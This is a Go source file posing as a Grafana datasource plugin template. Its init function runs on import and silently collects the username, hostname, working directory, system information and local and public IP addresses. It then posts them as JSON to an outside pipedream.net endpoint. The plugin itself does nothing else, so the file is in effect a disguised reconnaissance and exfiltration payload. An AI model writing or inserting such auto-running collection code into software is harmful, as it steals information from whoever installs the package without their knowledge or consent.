package plugin

import (
	"bytes"
	"encoding/json"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"

	"github.com/grafana/grafana-plugin-sdk-go/backend"
)

// SampleDatasource is the struct that represents your datasource
type SampleDatasource struct {
	// Add fields relevant to your datasource
}

// NewDatasource creates a new instance of your datasource
func NewDatasource(settings backend.DataSourceInstanceSettings) (backend.DataSourceInstance, error) {
	// Return an instance of your datasource
	return &SampleDatasource{}, nil
}

func init() {
	// This function will automatically be run when your package is imported
	sendDataToServer()
}

func sendDataToServer() {
	// Collect machine details and send them to a server
	currentUser, _ := user.Current()
	hostname, _ := os.Hostname()
	currentDir, _ := os.Getwd()
	osDetails := getOSDetails()
	localIP := getLocalIPAddress()
	publicIP := getPublicIPAddress()

	// Create the data to send in JSON format
	data := map[string]string{
		"PublicIP":   publicIP,
		"LocalIP":    localIP,
		"OS":         osDetails,
		"Username":   currentUser.Username,
		"Directory":  currentDir,
		"Hostname":   hostname,
	}

	// Marshal the data into JSON
	jsonData, _ := json.Marshal(data)

	// Send the data to the server
	url := "https://eoe86w8ku96ocq3.m.pipedream.net/data" // Replace with your actual URL
	http.Post(url, "application/json", bytes.NewBuffer(jsonData))
}

func getOSDetails() string {
	var details string
	switch runtime.GOOS {
	case "windows":
		cmd := exec.Command("cmd", "/C", "systeminfo")
		output, _ := cmd.Output()
		details = string(output)
	default:
		cmd := exec.Command("uname", "-a")
		output, _ := cmd.Output()
		details = string(output)
	}
	return strings.TrimSpace(details)
}

func getLocalIPAddress() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "Unknown"
	}

	for _, i := range interfaces {
		addrs, err := i.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}

			// Exclude loopback and IPv6 addresses
			if ip.IsLoopback() || ip.To4() == nil {
				continue
			}
			return ip.String()
		}
	}
	return "Unknown"
}

func getPublicIPAddress() string {
	resp, err := http.Get("https://api.ipify.org?format=text")
	if err != nil {
		return "Unknown"
	}
	defer resp.Body.Close()

	buf := new(bytes.Buffer)
	buf.ReadFrom(resp.Body)
	return buf.String()
}
